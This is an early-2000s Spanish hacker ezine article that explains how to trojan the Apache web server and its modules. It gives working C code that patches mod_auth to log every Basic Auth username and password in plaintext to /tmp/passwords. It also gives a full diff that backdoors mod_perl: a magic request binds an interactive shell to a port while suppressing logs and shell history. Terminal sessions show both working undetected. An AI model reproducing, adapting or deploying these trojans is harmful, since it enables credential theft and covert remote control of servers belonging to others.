@@ -1,0 +1,625 @@
+---
+title: "ns7-0x12"
+ezine: "netsearch"
+---
+
+# ns7-0x12
+
+**Ezine:** netsearch
+
+<div className="ascii-content">
+
+```
+=-[ 0x12 ]-==================================================================
+=-[ NetSearch Ezine #7 ]-====================================================
+=-[ Troyanizando Apache y sus modulos  ]-====================================
+=-[ por Sp4rk ]-=============================================================
+
+QuasaR: Existe un tar.gz adjunto en el directorio mod_perl_backdoor
+
+*
+*** TROYANIZANDO APACHE Y SUS M╙DULOS  ( Sp4rK &lt;sp4rk@undersec.com> )
+*
+
+*** 0. INTRODUCCI╙N
+
+Este documento se trata de una explicacion sobre como troyanizar Apache y sus
+modulos (mod_perl,PHP,mod_ssl...). Lo que es la base teorica hace que el
+documento sea aplicable a cualquier otro software, aunque la parte practica
+(ejemplos,codigo,etc) es tan solo aplicable a Apache y los modulos que aqui
+se troyanizaran.
+
+Para aquellos que no lo sepan, un troyano es un programa que actua de manera
+diferente a la que realmente esperamos de el. Es decir, un troyano del coman
+do 'ls' podria hacer la funcion normal de listar archivos pero ocultando
+algunos de ellos.
+
+NOTA: Todo lo que es la historia de Apache y tal, que tal si nos lo saltamos?
+      Claro que sφ! QuΘ c*** nos importa a nosotros ahora mismo? ;)
+
+
+*** 1. POR DONDE EMPEZAMOS
+
+Digo yo que habra que bajarse los fuentes de Apache primero, no?
+Pues bajamos Apache[1] y lo descomprimimos. (aka tar zxvf Apache-X.XX.tar.gz)
+
+Ahora viene la pregunta: "Y ahora quΘ?"
+
+Hombre... podrφas bajar a un bar a tomarte unas cervezas o echar un ..[2] con
+la novia, pero ya que estamos aqui, por que NO seguir con esto? Y por que SI?
+
+Como decia... A  partir de ahora empieza la fase de anßlisis del software.
+
+[1] http://www.Apache.org
+[2] Se sobreentiende "echar un trivial" o, en su defecto, "echar un parchis"
+
+**  1.1. AN┴LISIS DEL SOFTWARE
+*   1.1.1. Introduccion
+
+En esta fase se trata de ir leyendo codigo y encontrando conexiones entre fun
+ciones. No hace falta leerlo TODO. Simplemente tenemos que buscar aquellas fun
+ciones que deberemos modificar para conseguir nuestro objetivo.
+
+Sin embargo eso sφ requiere leer una parte del c≤digo e ir entendiendo 1
+poco como funciona el software por dentro, por lo que hay que tener paciencia.
+(seguro que de esto tenemos mucho... a que si? me lo imaginaba)
+
+Este es el momento en el que podemos acabar amargadφsimos, medio locos o con
+cara de puntero porque, a veces, entender c≤mo ha sido programado algo es real
+mente un co±azo. (si no os lo creeis, solo os hace falta ver mi estado habi
+tual de autismo, que, metaforicamente hablando, es como estar mirando fijamen
+te a NULL)
+
+Suele haber un directorio llamado "src" o varios directorios en los que se
+organizan los fuentes si el software en concreto es suficientemente denso. En
+el caso de Apache nuestro querido directorio es $APACHE/src[3]
+
+[3] $APACHE a partir de ahora se refiere al directorio raiz de los fuentes de
+    Apache
+
+
+*   1.1.2. Y ahora?
+
+Dependiendo del programa se empezarß por una parte u otra pero sea como sea
+buscaremos:
+
+        - Estructuras/variables interesantes
+        - Funciones que las modifiquen
+        - Funciones principales
+
+Para aclararnos un poco sobre quΘ mirar en Apache tenemos en el archivo
+$APACHE/src/include/httpd.h algunas de las estructuras mßs jugosas de todo el
+c≤digo. ╔stas son:
+
+
+struct server_rec;
+	Guarda variables relativas al servidor de Apache actual.
+
+struct request_rec;
+	Guarda variables relativas a la petici≤n actual que sirve el hijo de
+    Apache en concreto.
+
+struct conn_rec;
+	Guarda variables relativas a la conexi≤n hecha a Θste hijo.
+
+struct htaccess_result;
+	Guarda variables relativas a el resultado de aplicar una restricci≤n
+    desde un archivo .htaccess (o como se llame en vuestro Apache)
+
+
+Voy a detallar algunas las variables interesantes de todas estas estructuras
+documentada en la cabecera httpd.h
+
+
+server_rec:(
+	char *error_fname;
+		Path completo al archivo de logeo de errores
+	FILE *error_log;
+		Descriptor de archivo de este
+	int loglevel;
+		Nivel de logeo de errores
+	int timeout;
+		Timeout de el servidor actual (por peticion)
+	int keep_alive_timeout;
+		Tiempo maximo a esperar para la siguiente peticion en una sesion
+		HTTP permanente
+	uid_t server_uid;
+		EUID cuando se utiliza un wrapper (suExec)
+	gid_t server_gid;
+		EGID cuando se utiliza un wrapper (suExec)
+):
+
+
+request_rec:(
+	conn_rec *connection;
+		Puntero a la estructura de datos referente a la conexion actual
+	server_rec *server;
+		Puntero a la estructura de datos referente al servidor (hijo) actual
+	char *the_request;
+		Primera lφnea de la petici≤n HTTP
+	char *protocol;
+		Tipo y versi≤n del protocolo
+	int proto_num;
+		Versi≤n del protocolo (1.1 = 1001, 0.9 = 0009)
+	const char *hostname;
+		Nombre de host especificado en "Host: tal.cual.es"
+	const char *method;
+		MΘtodo utilizado por la petici≤n
+	int method_number;
+		N·mero del mΘtodo (M_GET,M_POST,M_HEAD)
+	char *unparsed_uri;
+		La URI sin aplicarle formateo alguno
+	char *uri;
+		La URI jejeje
+	char *filename;
+		El archivo sobre el que trabaja la petici≤n
+	char *args;
+		Argumentos de la petici≤n (?var1=valor1&var2=valor2...)
+	const struct htaccess_result *htaccess;
+		Lista enlazada de los parametros de configuracion del archivo .htaccess
+):
+
+
+conn_rec:(
+	server_rec *server;
+		Puntero a la estructura de datos referente al servidor (hijo) actual
+	struct sockaddr_in local_addr;
+		Estructura de datos referente a la direccion local
+	struct sockaddr_in remote_addr;
+		Estructura de datos referente a la direccion remota
+	char *remote_ip;
+		IP remota
+	char *remote_host;
+		Nombre de host al que resuelve remote_ip (si resuelve :P)
+	char *user;
+		El usuario bajo el que se ejecuta la petici≤n actual si se ha
+		establecido algun tipo de autenticacion
+):	
+
+htaccess_result:(
+	char *dir;
+		El directorio al que se aplica la directriz actual
+	int override;
+		Los parametros que pueden redefinirse en el archivo .htaccess
+	void *htaccess;
+		Las directrices de configuraci≤n
+	const struct htaccess_result *next;
+		Puntero a la siguiente estructura htaccess_result
+):
+
+Ahora ya tenemos unas cuantas variables con las que jugar, por lo que vamos
+a ponernos un primer objetivo.
+
+
+*
+*** OBJETIVO 1 ------------------
+*
+
+*** 2. LOGEO DE PETICIONES
+**  2.1 Introduccion
+
+Para este primer ejemplo vamos a modificar Apache de manera que cada peticion
+va a ser logeada en un archivo concreto. Es decir, vamos a implementar de la
+manera mßs sencilla un mecanismo de logeo de peticiones para meternos un poco
+en el tema de modificacion de modificacion de Apache.
+
+Bien, quΘ debemos hacer ahora? Pues una vez tenemos las variables que queremos
+vamos a empezar a leer c≤digo para entender c≤mo funciona el programa.
+
+Lo mejor suele ser buscar la funci≤n main() y a partir de ahi ir recurriendo a
+cada una de las funciones a las que llama para seguir el programa. De hecho,
+es lo mßs logico xD
+
+NOTA: Me saltara todas las deducciones que voy haciendo a medida que leo c≤digo
+      porque si no el documento podria hacerse larguisimo. Es decir, saltamos
+      toda la parte de analisis del software hecha por mi y os presento los
+      resultados/conclusiones que he sacado.
+
+
+**  2.2 El c≤digo analizado
+
+Veamos, por cada peticion que se ejecuta con Θxito (aka HTTP_OK (400)), se lla
+ma a la funci≤n ap_process_request(request_rec *r). La estructura r ya ha
+sido rellenada anteriormente con los datos de la peticion, con lo que podemos
+establecer este, como un punto para introducir nuestra funci≤n de logeo de
+peticiones.
+
+
+**  2.3 Implementacion
+
+Vamos a crear una funcion muy simple que abre un archivo y a±ade al final
+los datos de la estructura request_rec que se le pasa como argumento. Esto es:
+
+<++> apache-log.c
+<-->
+
+Bien teniendo la funcion, la implementamos en http_request.c y probamos quΘ tal
+funciona nuestro "nuevo Apache".
+
+NOTA: No se implementa control de errores por motivos que resultan mas que
+      obvios. O acaso vas a cargarte un hijo de Apache x no poder logear la
+      peticion? :P
+
+Recompilamos Apache, reinstalamos y reiniciamos el servicio y hacemos algo
+tal que asi:
+
+[root@armadillo:~]# telnet localhost 80
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+GET / HTTP/1.0
+
+HTTP/1.1 200 OK
+Date: Fri, 05 Oct 2001 16:53:57 GMT
+Server: Apache/1.3.20 (Unix) PHP/4.0.6 mod_perl/1.26
+Last-Modified: Wed, 29 Aug 2001 20:55:49 GMT
+ETag: "ad6b-15-3b8d56d5"
+Accept-Ranges: bytes
+Content-Length: 21
+Connection: close
+Content-Type: text/html
+
+&lt;HTML>
+hola!
+&lt;/HTML>
+Connection closed by foreign host.
+[root@armadillo:~]# cat /tmp/mylog
+"GET /" by 127.0.0.1 PID: 65534 GID: 65534
+
+Como vemos, funciona a la perfeccion, si bien es un ejemplo bastante inutil
+XDDDD
+
+Es hora de ponernos un objetivo con mßs sentido....
+
+
+*
+*** OBJETIVO 2 ------------------
+*
+
+*** 3. ESNIFADO DE CONTRASENYAS
+**  3.1 Introduccion
+
+Esta vez, nuestro objetivo es modificar el c≤digo de manera que Apache guar
+de en el directorio /tmp un archivo llamado passwords en el que escriba los
+pares de usuario/contrase±a de cada petici≤n en la que es necesaria una
+autenticacion previa por parte del cliente.
+
+Para ello hemos leφdo el RFC de HTTP/1.0 y HTTP/1.1 y sabemos que existen 2
+mΘtodos bßsicos de autenticacion: la bßsica y la de algoritmo de digesto
+(aka digest XD (por cierto,vaya palabra mßs fea!))
+
+Para este ejemplo vamos a capturar y logear tan solo aquellas peticiones
+que impliquen una autenticaci≤n bßsica en la que usuario y contrase±a van
+en texto plano. Ademßs este tipo de autenticaci≤n es el mßs extendido, aunque
+no el mßs seguro (cosa que suele pasar demasiado a menudo).
+
+Bien, ahora hace falta buscar alguna referencia sobre contrase±as en el c≤digo
+fuente, sobre autenticaci≤n, lo que sea. Mi "tΘcnica" se basa en grep's xD es
+lo peor pero funciona muy bien. Nos metemos en el directorio src/ y ahi empe
+zamos a buscar a base de grep's y leer c≤digo. Este metodo cutre salchichero
+nos permitira, normalmente, dar con nuestro objetivo de una manera mas rapida.
+
+NOTA: Una vez mas me salto todo el proceso de analisis del codigo y paso a
+      comentar los resultados.
+
+**  3.2 El codigo re-analizado
+
+Veamos, el 80% d las funciones pertenecientes a la autenticacion de usuarios
+en Apache se realiza a traves de un modulo, el mod_auth. Bien, despues de
+seguir un poco el codigo de $APACHE/src/modules/standard/mod_auth.c, nos
+encontramos con una funcion clave: authenticate_basic_user(request_rec *r)
+
+Sencillamente, chequea si el nombre de usuario y el password dado coinciden
+con alguna entrada en el archivo de contrase±as dado y devuelve el resultado.
+
+
+**  3.3 Implementacion
+
+Lo que hemos implementado esta vez son 2 cosas: una nueva funcion y la modifi
+cacion de authenticate_basic_user(). Esto es:
+
+int NS_sniff(const char *user, const char *password, int caso) {
+	FILE *logfile;
+	char path[]="/tmp/passwords";
+
+	logfile = fopen(path,"a");
+	switch(caso) {
+		case SATISFY_ALL:
+			fprintf(logfile,"*** Autenticacion erronea (usuario invalido): \
+%s/%s\n",user,password);
+			break;
+		case SATISFY_ANY:
+			fprintf(logfile,"*** Autenticacion erronea (contrase±a invalida\
+): %s/%s\n",user,password);
+			break;
+		case SATISFY_NOSPEC:
+			fprintf(logfile,"*** Autenticacion correcta: %s/%s\n",user,
+            password);
+			break;
+		default:
+			fprintf(logfile,"--- ERROR ---\n");
+			break;
+		}
+
+	fclose(logfile);
+	return 0;
+}
+
+static int authenticate_basic_user(request_rec *r)
+{
+	auth_config_rec *sec =
+	(auth_config_rec *) ap_get_module_config(r->per_dir_config, &auth_module);
+	conn_rec *c = r->connection;
+	const char *sent_pw;
+	char *real_pw;
+	char *invalid_pw;
+	int res;
+
+	if ((res = ap_get_basic_auth_pw(r, &sent_pw)))
+	return res;
+
+	if (!sec->auth_pwfile)
+	return DECLINED;
+
+	if (!(real_pw = get_pw(r, c->user, sec->auth_pwfile))) {
+	if (!(sec->auth_authoritative))
+		return DECLINED;
+	NS_sniff(c->user,sent_pw,SATISFY_ALL); /********************************/
+	ap_log_rerror(APLOG_MARK, APLOG_NOERRNO|APLOG_ERR, r,
+			"user %s not found: %s", c->user, r->uri);
+	ap_note_basic_auth_failure(r);
+	return AUTH_REQUIRED;
+	}
+	invalid_pw = ap_validate_password(sent_pw, real_pw);
+	if (invalid_pw != NULL) {
+	NS_sniff(c->user,sent_pw,SATISFY_ANY); /********************************/
+	ap_log_rerror(APLOG_MARK, APLOG_NOERRNO|APLOG_ERR, r,
+			  "user %s: authentication failure for \"%s\": %s",
+			  c->user, r->uri, invalid_pw);
+	ap_note_basic_auth_failure(r);
+	return AUTH_REQUIRED;
+	}
+	NS_sniff(c->user,sent_pw,SATISFY_NOSPEC); /*****************************/
+	return OK;
+}
+
+
+Creo que no hay mucho que comentar. A authenticate_basic_user() se le han
+a±adido 3 lineas (marcadas con /***...***/) que se encargan de esnifar los
+intentos de autenticacion y NS_sniff hace el logeo :P
+
+Viendo este ejemplo parece mas interesante, verdad? ;)
+
+
+*
+*** OBJETIVO 3 ------------------
+*
+
+*** 4. BINDEAR UNA SHELL A UN PUERTO
+**  4.1 Introduccion
+
+Ahora vamos a hacer algo mucho mas interesante y, a la vez, de una manera
+bastante diferente =)
+
+Modificaremos mod_perl para que cuando reciba una peticion X el hijo de
+apache actual nos informe del puerto donde ha bindeado una shell para que
+podamos utilizar el sistema remotamente.
+
+Simplemente como comentario y para quien no lo sepa, mod_perl es lo que
+intuitivamente indica su nombre. Un modulo de Apache que permite la ejecucion
+de scripts en perl.
+
+**  4.2 El nuevo codigo analizado
+
+Una vez mas, me salto todo el analisis que hago del software mod_perl y paso
+a describir lo que he encontrado.
+
+Toda peticion que es manejada por mod_perl pasa por la funcion perl_handler()
+Esto nos permite establecer este punto como clave para la modificacion que
+queremos hacer.
+
+**  4.3 Implementacion
+
+El siguiente fragmento de codigo se corresponde a la salida de `diff` al
+comparar el archivo $MOD_PERL/apaci/mod_perl.c con mi modificacion:
+
+
+--- apaci/mod_perl.c	Tue Aug 28 13:42:19 2001
++++ apaci/mod_perl-1.26-DMN.c	Tue Aug 28 15:46:12 2001
+@@ -52,8 +52,14 @@
+  * And so it was decided the camel should be given magical multi-colored
+  * feathers so it could fly and journey to once unknown worlds.
+  * And so it was done...
++ *
++ * Heh, funny literature... but Dementhia has doped your camel and it's doing
++ * some nasty things =)
+  */
+ 
++#define POISON "GET     /fuckme.pl"
++#define MAXCSTRINGLEN 512
++
+ #define CORE_PRIVATE 
+ #include "mod_perl.h"
+ 
+@@ -821,6 +827,60 @@
+     dPPREQ;
+     dTHR;
+     GV *gv;
++
++/* *** BEGIN ***
++ * Added from mod_perl-1.26-DMN trojan
++ * by Dementhia &lt;dementhia@undersec.com>
++ *
++ */
++
++	struct sockaddr_in sock;
++	int ss,sc,x=0,result=1,end=0;
++	unsigned int puertos[] = {9000,9001,9002,0};
++	char *args[] = {"/bin/sh","-i",NULL};
++	char *env[] = {"HISTFILE=/dev/null",NULL};
++	char cstring[MAXCSTRINGLEN];
++
++	if (!strcmp(POISON,r->the_request)) {
++		r->server->error_log = NULL;
++		memset((void *)&sock,0,sizeof(struct sockaddr_in));
++		sock.sin_family = AF_INET;
++		sock.sin_addr.s_addr = INADDR_ANY;
++		sock.sin_port = htons(puertos[x]);
++		ss = socket(PF_INET,SOCK_STREAM,IPPROTO_TCP);
++
++		while (bind(ss,(struct sockaddr *)&sock,sizeof(sock)) < 0) {
++			if (!puertos[x+1]) {
++				close(ss);
++				end=1;
++				break;
++			} else {
++				x++;
++				sock.sin_port=htons(puertos[x]);
++			}
++		}
++
++		if (end == 0) {
++			memset((char *)cstring,0,MAXCSTRINGLEN);
++			snprintf(cstring,MAXCSTRINGLEN,"\n*** Mod_perl-1.26-DMN trojan by Dementhia &lt;dementhia@undersec.com>\n*** UNDERSEC Security TEAM &lt;http://www.undersec.com>\n*** Use at your own risk. It's been written ONLY as a proof of concept...\n*** So if you are an admin... go&catch the fucking script kiddie who's using it\n\n\033[30GDON'T BLAME AT US!\n\n\033[22G.oO Shell binded at port %i Oo.\n",puertos[x]);
++			write(r->connection->client->fd,cstring,MAXCSTRINGLEN);
++			listen(ss,1);
++			sc = accept(ss,(struct sockaddr *)&sock,(int *)sizeof(sock));
++			dup2(sc,0);
++			dup2(sc,1);
++			dup2(sc,2);
++			execve(args[0],args,env);
++			close(ss);
++		}
++	} else {
++		r->server->error_log = stderr;
++	}
++
++/* 
++ * Added from mod_perl-1.26-DMN trojan
++ * by Dementhia &lt;dementhia@undersec.com>
++ * *** END ***
++ */
+ 
+ #ifdef USE_ITHREADS
+     dTHX;
+
+
+
+
+Lo que realmente hace este parche es parchear (valga la redundancia) mod_perl
+de manera que cada vez que recibe una peticion X bindea una shell interactiva
+a un puerto de entre una lista de puertos que se le especifica. Nos avisa del
+puerto en el que bindeo y consigue que la peticion actual NO se loguee. Por
+cierto, HISTFILE apunta a NULL por lo que olvidaros de tener que borrar los
+.*history :P
+
+Como hace todo esto? Bien, os explico algunos de los trucos. Tenemos la suer
+te que las peticiones se logean despues de que superen perl_handler() por lo
+que cogemos y durante esta peticion cambiamos la configuracion de apache
+de manera que el fd del archivo de logs sea NULL. Con esto, el logeo de
+Apache fallara sin ni siquiera quejarse. Cuando la peticion que recoge el
+modulo no coincide con la nuestra se asegura que el fd del log de errores de
+Apache sea stderr, con lo que todos los errores vuelven a logearse con norma
+lidad.
+
+Ademas, partimos del principio que un "GET /index.html" no es la misma peti
+cion que "GET   /index.html" por mucho que Apache acabe asignando los mismos
+valores en algunas de las variables de la estructura request_rec en los 2
+casos (en concreto, las variables: r->filename, r->method...)
+
+**  4.4 Implementacion real
+
+Como este ejemplo es el mas interesante, a la vez que configurable, de todos,
+he hecho una implementacion. Se trata de un bash script que, a base de pregun
+tas crea el .diff y un script de instalacion a tu medida. Tan solo hace falta
+seguir las instrucciones del README.
+
+Casi me olvidaba! Quereis ver que tal funciona el bichito??? A q si? :P
+Aqui va:
+
+[root@armadillo:~]# telnet localhost 80
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+GET    /backdoor.pl
+
+*** Mod_perl-1.26-DMN trojan by Dementhia &lt;dementhia@undersec.com>
+*** UNDERSEC Security TEAM &lt;http://www.undersec.com>
+*** Use at your own risk. It's been written ONLY as a proof of concept...
+*** So if you are an admin... go&catch the fucking script kiddie who's using it
+
+                             DON'T BLAME AT US!
+
+                     .oO Shell binded at port 9000 Oo.
+
+(ahora cambiamos de terminal)
+
+[root@armadillo:~]# telnet localhost 9000
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+sh: no job control in this shell
+sh-2.05$ ls
+ls
+bin
+boot
+dev
+etc
+home
+lib
+lost+found
+mnt
+opt
+proc
+root
+rsbac
+sbin
+swap
+tmp
+usr
+var
+sh-2.05$
+sh-2.05$ exit
+Connection closed by foreign host.
+
+(Si ahora buscamos la cadena "GET    /backdoor.pl" en los logs...)
+
+[root@armadillo:~]# grep backdoor /usr/local/apache/logs/*
+[root@armadillo:~]#
+
+
+Ingenioso, verdad? :)
+
+
+NOTA: Los fragmentos de codigo aqui implementados han sido testeados bajo
+      Apache 1.3.20 y utilizando un servidor con soporte para modulos
+      "--enable-module=so" y corriendo en standalone.
+
+CURIOSIDADES:
+
+NOTA:
+ Con "grep ^* apache.txt | cut -b5-" puedes sacar el indice del documento
+
+Ddikdo a Rik
+
+============== ===== === -- -  -
+Sp4rK &lt;sp4rk@undersec.com>
+UNDERSEC Security Team
+
+
+
+
+
+
+
+
+
+
+
+
+
+(Que ya se ha acabado, no intentes leer mas abajo porque no hay mas!! :PP)
+
+```
+
+</div>
